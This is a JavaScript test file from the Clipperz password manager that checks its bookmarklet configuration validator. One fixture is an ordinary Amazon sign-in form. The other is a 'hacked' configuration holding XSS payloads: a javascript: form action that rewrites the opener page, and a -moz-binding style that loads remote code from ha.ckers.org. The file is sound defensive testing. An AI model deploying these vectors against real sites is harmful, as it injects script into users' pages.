/*

Copyright 2008-2015 Clipperz Srl

This file is part of Clipperz, the online password manager.
For further information about its features and functionalities please
refer to http://www.clipperz.com.

* Clipperz is free software: you can redistribute it and/or modify it
  under the terms of the GNU Affero General Public License as published
  by the Free Software Foundation, either version 3 of the License, or 
  (at your option) any later version.

* Clipperz is distributed in the hope that it will be useful, but 
  WITHOUT ANY WARRANTY; without even the implied warranty of 
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
  See the GNU Affero General Public License for more details.

* You should have received a copy of the GNU Affero General Public
  License along with Clipperz. If not, see http://www.gnu.org/licenses/.

*/

function testBookmarkletConfigurationString (aConfiguration, shouldFail, aMessage) {
//	var configuration;

//try {
//	configuration = Clipperz.Base.evalJSON(aConfiguration);
//} catch (exception) {
//	console.log("EXCEPTION", exception);
//	throw exception;
//}

//console.log("configuration", configuration);

	if (shouldFail == true) {
		try {
			Clipperz.PM.BookmarkletProcessor.checkBookmarkletConfiguration(aConfiguration);
			SimpleTest.ok(false, "vulnerability not caught - " + aMessage);
		} catch(exception) {
			SimpleTest.ok(true, "vulnerability correctly caught - " + aMessage);
		}
	} else {
		try {
			Clipperz.PM.BookmarkletProcessor.checkBookmarkletConfiguration(aConfiguration);
			SimpleTest.ok(true, "configuration correctly checked - " + aMessage);
		} catch(exception) {
			SimpleTest.ok(false, "configuration wrongly caught as malicious - " + aMessage);
//			console.log(exception);
		}
	}
}

//#############################################################################

var tests = {

    //-------------------------------------------------------------------------

	'simpleAmazonConfiguration_test': function () {
		var bookmarkletConfigurationString;
	
		bookmarkletConfigurationString = "{"+
			"\"page\": {\"title\": \"Sign In\"},\n" +
			"\"form\": {" +
				"\"attributes\": {" +
					"\"action\": \"https://www.amazon.com/gp/flex/sign-in/select.html\",\n" +
					"\"method\": \"post\"" +
				"},\n" +
				"\"inputs\": [" +
					"{\"type\": \"hidden\",\n\"name\": \"path\",\n\"value\": \"/gp/yourstore\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"useRedirectOnSuccess\",\n\"value\": \"1\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"query\",\n\"value\": \"signIn=1&action=sign-out&useRedirectOnSuccess=1&path=/gp/yourstore&ref_=pd_irl_gw_r\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"mode\",\n\"value\": \"\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"redirectProtocol\",\n\"value\": \"\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"pageAction\",\n\"value\": \"/gp/yourstore\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"disableCorpSignUp\",\n\"value\": \"\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"protocol\",\n\"value\": \"https\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"sessionId\",\n\"value\": \"105-1479357-7902864\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"referer\",\n\"value\": \"flex\"},\n" +
					"{\"type\": \"text\",\n\"name\": \"email\",\n\"value\": \"\"},\n" +
					"{\"type\": \"password\",\n\"name\": \"password\",\n\"value\": \"\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"metadata1\",\n\"value\": \"Firefox 3.0.3 Mac\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"metadataf1\",\n\"value\": \"\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"metadata2\",\n\"value\": \"Default Plug-in Java Embedding Plugin 0.9.6.4 Shockwave Flash 90124RealPlayer Plugin QuickTime Plug-in 7.5.5 Flip4Mac Windows Media Plugin 2.2  4||1440-900-878-24-*-*-*\"},\n" +
					"{\"type\": \"hidden\",\n\"name\": \"metadata3\",\n\"value\": \"timezone: -1 execution time: 3\"},\n" +
					"{\"name\": \"action\",\n\"type\": \"radio\",\n\"options\": [" +
						"{\"value\": \"new-user\",\n\"checked\": false},\n" +
						"{\"value\": \"sign-in\",\n\"checked\": true}" +
					"]}" +
				"]" +
			"},\n" +
			"\"version\": \"0.2.3\"" +
		"}";
		testBookmarkletConfigurationString(bookmarkletConfigurationString, false, "regular Amazon.com configuration");
	},

    //-------------------------------------------------------------------------

	'hackedConfigurationWithXSSAttackVectorReadyToBeTriggeredWhenActivatingTheDirectLogin_test': function () {
		var bookmarkletConfigurationString;
	
		bookmarkletConfigurationString = "{" +
			"\"page\": {\"title\": \"Example Attack\"}," +
			"\"form\": {  " +
				"\"attributes\": {    " +
					"\"action\": \"javascript:opener.document.body.innerHTML = 'hacked!';close();\",    " +
					"\"style\": \"-moz-binding:url('http://ha.ckers.org/xssmoz.xml#xss')\",    " +
					"\"method\": null  " +
				"},  " +
				"\"inputs\": [" +
					"{\"type\": \"text\", \"name\": \"username\", \"value\": \"\"},             " +
					"{\"type\": \"password\", \"name\": \"password\", \"value\": \"\"}" +
				"]" +
			"}," +
			"\"version\": \"0.2.3\" " +
		"}";
		testBookmarkletConfigurationString(bookmarkletConfigurationString, false, "hacked configuration that is trying to inject a XSS attack vector. It should not fail, as it is responsability of the direct login to avoid triggering such attack vector");
	},

    //-------------------------------------------------------------------------
    'syntaxFix': MochiKit.Base.noop
}

//#############################################################################

SimpleTest.runDeferredTests("Clipperz.PM.BookmarkletProcessor", tests, {trace:false});
